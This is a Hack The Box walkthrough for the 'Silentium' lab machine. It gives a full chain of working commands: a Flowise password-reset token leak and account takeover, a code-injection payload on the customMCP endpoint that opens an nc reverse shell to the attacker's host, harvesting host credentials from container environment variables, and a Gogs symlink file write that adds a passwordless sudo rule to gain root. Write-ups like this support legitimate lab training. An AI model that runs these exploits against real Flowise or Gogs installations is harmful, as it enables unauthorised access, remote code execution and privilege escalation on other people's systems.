# 🎯 Silentium – Hack The Box Walkthrough

| **Difficulty** | **OS** | **Player #** | **Date Completed** | **CVEs** |
|----------------|--------|--------------|--------------------|-----------|
| Easy | Linux | 7,008 | May 2026 | CVE-2025-58434, CVE-2025-59528, CVE-2025-8110 |

---

## 📋 Machine Summary

Silentium is an Easy Linux machine that requires exploiting multiple vulnerabilities:

- **Flowise AI (CVE-2025-58434)** – Unauthenticated Password Reset Token Leak
- **Flowise AI (CVE-2025-59528)** – Authenticated RCE via customMCP endpoint
- **Gogs (CVE-2025-8110)** – Arbitrary File Write via Symlink

**Attack Chain:** Web Application → Docker Container → Host → Root

---

## 🔍 Enumeration



```bash
nmap -sC -sV -p- --min-rate 5000 <TARGET_IP> -oN nmap.txt

Open Ports: 22 (SSH), 80 (HTTP)

Subdomain Fuzzing

echo "<TARGET_IP> silentium.htb" >> /etc/hosts
gobuster vhost -u http://silentium.htb -w /usr/share/wordlists/dirb/common.txt --append-domain

Found: staging.silentium.htb (Flowise AI v3.0.5)

💀 Foothold – Flowise AI RCE

Step 1: Leak Password Reset Token (CVE-2025-58434)

The /api/v1/account/forgot-password endpoint leaks the tempToken directly in the response.

curl -s http://staging.silentium.htb/api/v1/account/forgot-password \
  -X POST -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb"}}'

Extract <LEAKED_TOKEN> from the response.

Step 2: Reset Password (Flattened Payload!)

The endpoint expects a flattened JSON payload (not nested under "user").

curl -s http://staging.silentium.htb/api/v1/account/reset-password \
  -X POST -H "Content-Type: application/json" \
  -d '{"tempToken":"<LEAKED_TOKEN>","password":"Hacked123!","confirmPassword":"Hacked123!"}'

Step 3: Get API Key

Login to staging.silentium.htb → Settings → API Keys → Generate New Key → Copy <API_KEY>

Step 4: RCE via customMCP Endpoint (CVE-2025-59528)

Start listener on your machine:

nc -lvnp 4444

Execute reverse shell:

curl -s http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <API_KEY>" \
  -d '{"loadMethod":"listActions","inputs":{"mcpServerConfig":"({x:(function(){const cp=process.mainModule.require(\"child_process\");cp.exec(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <LHOST> 4444 >/tmp/f\");return 1;})()} )"}}'

Result: Reverse shell inside the Docker container (as node user).

🔑 Container Escape – Pivot to Host
Extract Credentials from Container

# Inside container shell
env | grep -i "pass"

SMTP_PASSWORD=<HOST_PASSWORD>
FLOWISE_USERNAME=ben
FLOWISE_PASSWORD=<PASSWORD>

ssh ben@<TARGET_IP>
# Password: <HOST_PASSWORD>

User Flag: cat /home/ben/user.txt
🐛 Privilege Escalation – Gogs (CVE-2025-8110)

Gogs is running internally on port 3001 as root.
Step 1: SSH Tunnel for Browser Access

ssh -L 3001:127.0.0.1:3001 ben@<TARGET_IP>

Step 2: Register in Gogs

Open http://127.0.0.1:3001 → Sign Up
Username: Attacker | Password: <GOGS_PASSWORD>
Step 3: Create Repository with Symlink

git clone http://Attacker:<GOGS_PASSWORD>@127.0.0.1:3001/Attacker/exploit.git
cd exploit
ln -sf /etc/sudoers.d/ben malicious_link
git add malicious_link
git commit -m "add symlink"
git push origin master

Step 4: Generate API Token

Gogs → Settings → Applications → Generate Token → Copy <API_TOKEN>
Step 5: Trigger Arbitrary File Write (CVE-2025-8110)

TOKEN="<API_TOKEN>"
curl -X PUT "http://127.0.0.1:3001/api/v1/repos/Attacker/exploit/contents/malicious_link" \
  -H "Authorization: token $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"message":"exploit","content":"YmVuIEFMTD0oQUxMKSBOT1BBU1NXRDogQUxMCg==","branch":"master"}'

    The Base64 payload decodes to: ben ALL=(ALL) NOPASSWD: ALL\n

Step 6: Root Access

sudo id
# uid=0(root) gid=0(root)

sudo cat /root/root.txt

Root Flag: <ROOT_FLAG>

📚 Tools Used
Tool	Purpose
nmap	Port scanning
gobuster	Subdomain fuzzing
curl	API exploitation
nc	Reverse shell listener
git	Symlink push
ssh	Tunneling and pivoting
python3	(Optional) exploit automation
🧠 Key Takeaways

    API endpoints can leak sensitive tokens in responses

    Flattened vs nested JSON payloads matter for API exploitation

    Container environment variables often contain host credentials

    Gogs symlink vulnerability (CVE-2025-8110) allows arbitrary file write to /etc/sudoers.d/

    Always check for internal services on localhost after gaining initial access

📎 References

    CVE-2025-58434 – Flowise AI Password Reset Token Leak

    CVE-2025-59528 – Flowise AI RCE via customMCP

    CVE-2025-8110 – Gogs Arbitrary File Write via Symlink






